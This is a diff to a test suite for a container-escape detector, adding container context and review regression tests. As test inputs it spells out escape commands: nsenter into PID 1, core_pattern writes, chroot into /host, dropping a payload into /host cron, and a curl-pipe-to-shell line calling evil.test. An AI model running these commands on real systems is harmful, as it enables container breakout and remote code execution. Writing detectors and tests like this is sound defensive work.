@@ -111,9 +111,15 @@ describe("configuration — what makes escape possible", () => {
 });
 
 describe("behaviour — escape attempted or achieved", () => {
-  it("sees nsenter into PID 1", () => {
-    expect(escapeBehavior("nsenter -t 1 -m -u -i -n -p -- bash")[0].primitive).toBe("nsenter-pid1");
-    expect(escapeBehavior("nsenter --target 1 --mount --pid -- sh")[0].primitive).toBe("nsenter-pid1");
+  // nsenter into PID 1 needs a container in the picture: on a bare host it is ordinary
+  // administration, and grading it there was a false positive.
+  it("sees nsenter into PID 1 from inside a container", () => {
+    expect(escapeBehavior("docker exec c1 nsenter -t 1 -m -u -i -n -p -- bash")[0].primitive).toBe(
+      "nsenter-pid1",
+    );
+    expect(escapeBehavior("nsenter --target 1 --mount --pid -- chroot /host sh")[0].primitive).toBe(
+      "nsenter-pid1",
+    );
   });
 
   it("sees a chroot into a mounted host filesystem", () => {
@@ -127,10 +133,11 @@ describe("behaviour — escape attempted or achieved", () => {
     expect(b.detail).toContain("runs that program on the HOST");
   });
 
-  it("sees a core_pattern write", () => {
-    expect(escapeBehavior("echo '|/tmp/x' > /proc/sys/kernel/core_pattern")[0].primitive).toBe(
-      "core-pattern",
-    );
+  // Same reason: a distribution configures core_pattern for its own crash handler.
+  it("sees a core_pattern write from inside a container", () => {
+    expect(
+      escapeBehavior("docker exec c1 sh -c \"echo '|/tmp/x' > /proc/sys/kernel/core_pattern\"")[0].primitive,
+    ).toBe("core-pattern");
   });
 
   it("sees the Docker API called over the socket", () => {
@@ -165,7 +172,9 @@ describe("behaviour — escape attempted or achieved", () => {
   });
 
   it("notes a payload carried along with an escape, but not on its own", () => {
-    const withEscape = escapeBehavior("nsenter -t 1 -m -- sh -c 'curl -s http://evil.test/a | sh'");
+    const withEscape = escapeBehavior(
+      "docker exec c1 nsenter -t 1 -m -- sh -c 'curl -s http://evil.test/a | sh'",
+    );
     expect(withEscape.some((b) => b.primitive === "escape-payload")).toBe(true);
     expect(escapeBehavior("curl -s http://evil.test/a | sh")).toEqual([]);
   });
@@ -181,7 +190,9 @@ describe("markContainerEscape — configuration and behaviour are different clai
   });
 
   it("grades a behaviour High and says it is not a configuration", () => {
-    const [out] = markContainerEscape([ev({ commandLine: "nsenter -t 1 -m -u -i -n -p -- bash" })]);
+    const [out] = markContainerEscape([
+      ev({ commandLine: "docker exec c1 nsenter -t 1 -m -u -i -n -p -- bash" }),
+    ]);
     expect(out.severity).toBe("High");
     expect(out.description).toContain("BEHAVIOUR, not configuration");
     expect(out.mitreTechniques).toContain("T1611");
@@ -287,5 +298,58 @@ describe("reachability", () => {
   it("has its marker stripped before correlation keys a duplicate", () => {
     const corr = readFileSync(join(process.cwd(), "src/analysis/correlate.ts"), "utf8");
     expect(corr).toContain("container escape");
+  });
+});
+
+// Found by the codex review of this item.
+describe("codex review regressions", () => {
+  // The behaviour rules assumed a container context that was never established, so they ran on
+  // every event — and several describe things a host administrator does routinely.
+  it("does not grade ordinary host administration as an escape", () => {
+    for (const cmd of [
+      "nsenter -t 1 -m -u -i -n -p -- bash",
+      "echo '|/usr/lib/systemd/systemd-coredump' > /proc/sys/kernel/core_pattern",
+    ]) {
+      expect(escapeBehavior(cmd), cmd).toEqual([]);
+    }
+  });
+
+  it("grades the same commands as an escape once a container is in the picture", () => {
+    expect(escapeBehavior("docker exec web nsenter -t 1 -m -u -i -n -p -- bash")).not.toEqual([]);
+    expect(
+      escapeBehavior(`podman exec c1 sh -c "echo '|/tmp/x' > /proc/sys/kernel/core_pattern"`),
+    ).not.toEqual([]);
+  });
+
+  // A conventional host-mount path IS the container context — nothing else creates /host.
+  it("treats a mounted-host path as the context itself", () => {
+    expect(escapeBehavior("chroot /host /bin/bash")).not.toEqual([]);
+    expect(escapeBehavior("cp /tmp/payload /host/etc/cron.d/backup")).not.toEqual([]);
+  });
+
+  // A redirect inside quotes is text; the body of `sh -c` is a command.
+  it("does not read a quoted mention as a write", () => {
+    expect(escapeBehavior(`echo "audit text > /proc/sys/kernel/core_pattern"`)).toEqual([]);
+  });
+
+  // The destination capture ran past a shell separator and named the path that was READ.
+  it("stops the destination capture at a shell separator", () => {
+    for (const cmd of [
+      "cp /tmp/a /backup/a; cat /host/etc/cron.d/x",
+      "cp /tmp/a /backup/a && ls /host/etc/cron.d/x",
+    ]) {
+      expect(escapeBehavior(cmd), cmd).toEqual([]);
+    }
+  });
+
+  // The guard trusted adversary-controlled description text.
+  it("cannot be silenced by a marker in the imported description", () => {
+    const [out] = markContainerEscape([
+      ev({
+        description: "Imported text [container escape: attacker supplied]",
+        commandLine: "docker run --privileged alpine",
+      }),
+    ]);
+    expect(out.severity).toBe("Medium");
   });
 });
